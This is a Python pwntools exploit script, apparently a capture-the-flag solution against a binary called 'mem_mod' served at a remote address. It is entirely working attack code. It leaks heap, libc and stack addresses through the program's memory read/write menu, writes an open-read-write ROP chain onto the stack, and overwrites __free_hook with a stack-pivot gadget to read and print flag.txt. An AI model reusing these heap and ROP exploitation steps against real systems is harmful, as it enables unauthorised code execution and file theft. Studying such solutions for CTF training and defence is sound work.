#!/usr/bin/python

from pwn import *
import sys

remote_ip, port = '20.216.39.14', 1235
binary = './mem_mod'
brkpts = '''
c
'''

elf = ELF("mem_mod")
libc = ELF("libc.so.6")

context.terminal = ['tmux', 'splitw', '-h']
context.arch = "amd64"
context.log_level = "debug"
context.aslr = False

re = lambda a: io.recv(a)
reu = lambda a: io.recvuntil(a)
rl = lambda: io.recvline()
s = lambda a: io.send(a)
sl = lambda a: io.sendline(a)
sla = lambda a,b: io.sendlineafter(a,b)
sa = lambda a,b: io.sendafter(a,b)

uu64 = lambda a: u64(a.ljust(8, chr(0)))

if len(sys.argv) > 1 and sys.argv[1] == "-r":
    io = remote(remote_ip, port)
    context.noptrace = True

elif len(sys.argv) > 1:
    io = gdb.debug(binary, brkpts, env = {'LD_PRELOAD' : './libc.so.6'})

else:
    io = process(binary, env = {'LD_PRELOAD' : './libc.so.6'})

def choice(idx):
    sla(">> ", str(idx))

def read(addr):
    choice(1)
    choice(hex(addr))

def write(addr, val):
    choice(2)
    choice(hex(addr))
    choice(hex(val))

def add(size, data):
    choice(3)
    choice(size)
    sa(">> ", str(data))

def free():
    choice(4)

def view():
    choice(5)

def getlower(addr):
    return addr & 0xffffffff

def getupper(addr):
    return addr >> 32

if __name__ == "__main__":
    add(10000, "a")
    view()
    heap = uu64(rl().strip()) - 0x1461

    free()
    write(heap + 0x2a0, 2**32 - 0x100)

    read(heap + 0x14c0)
    libc.address = int(rl().strip(), 16) - 0x1ecd70
    free_hook = libc.symbols['__free_hook']
    environ = libc.symbols['environ']
    pop_rdi = libc.address + 0x00023b72
    pop_rsi = libc.address + 0x0002604f
    pop_rdx_rbx = libc.address + 0x0015f7e6
    pop_rax = libc.address + 0x000473ff
    syscall = libc.address + 0x000630d9
    add_rsp = libc.address + 0x00052c37
    
    read(environ)
    stack = int(rl().strip(), 16) - 0x58

    rop = [
        pop_rdi, heap + 0x1f00,
        pop_rsi, 0,
        pop_rdx_rbx, 0, 0,
        pop_rax, 2,
        syscall,
        pop_rdi, 3,
        pop_rsi, heap + 0x2000,
        pop_rdx_rbx, 0x50, 0,
        pop_rax, 0,
        syscall,
        pop_rdi, 1,
        pop_rax, 1,
        syscall
    ]
    for i in range(len(rop)):
        write(stack+i*8, getlower(rop[i]))
        write(stack+(i*8+4), getupper(rop[i]))

    add(0x20, "flag.txt\x00")

    write(free_hook, getlower(add_rsp))
    write(free_hook + 4, getupper(add_rsp))

    free()

    io.interactive()
